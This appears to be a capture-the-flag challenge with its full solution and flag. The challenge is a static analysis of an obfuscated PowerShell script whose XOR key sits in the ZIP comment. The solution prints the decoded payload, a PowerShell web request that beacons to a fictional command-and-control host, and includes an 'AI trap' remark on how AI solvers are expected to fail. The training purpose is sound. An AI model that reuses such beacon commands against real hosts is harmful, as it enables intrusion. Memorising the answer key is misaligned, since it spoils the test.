# Challenge 22

## Title
Zola's Algorithm

## Difficulty
Hard | Points: 300

## Description
A S.H.I.E.L.D. agent received a suspicious archive titled `operation_insight.zip` seemingly from a high-ranking official. We suspect Arnim Zola's digital ghost is using it to infiltrate our network. We have disabled the execution policies, but we need you to perform static analysis on the script inside. Do not run the file. Extract the embedded logic and find the secret token it uses to authenticate with the C2 server.

## File
`operation_insight.zip` (Downloadable)

## Hint
*"You have a clock. I have a digital mind."* — Zola wouldn't hardcode a decryption key; he'd hide it where only the archive itself knows to look. Check the container's metadata.

## Solution
This is an advanced static malware analysis challenge.
1. The provided file is a `.zip` archive containing an obfuscated PowerShell script (`insight.ps1`).
2. The decryption key is NOT hardcoded in the script. It is hidden in the ZIP archive's comment metadata.
3. Players must extract the ZIP comment (using `unzip -z operation_insight.zip`, `exiftool`, or 7-Zip properties).
   The comment contains the key: `hYdR4_4lg0r1thm_57`
4. The extracted `.ps1` script contains obfuscated PowerShell code with a rolling XOR algorithm that decrypts a large array of integers.
5. Because CyberChef's standard XOR module struggles with rolling XOR combined with keys derived from external file properties, the player is forced to actually read the PowerShell logic and reimplement it in Python.
6. A quick Python script using the extracted key against the integer array from the script reveals the final payload command:
   `powershell -c "Invoke-WebRequest -Uri http://hydra-c2.network/drop?auth=cyn0x{p0w3rsh3ll_st4t1c_4n4lys1s}"`

**AI trap:** AI will likely attempt to use generic "XOR brute-force" techniques on the string, or look for the key exclusively within the PS1 text itself. It will likely fail to realize the key is in the ZIP archive comment.

## Flag
`cyn0x{p0w3rsh3ll_st4t1c_4n4lys1s}`
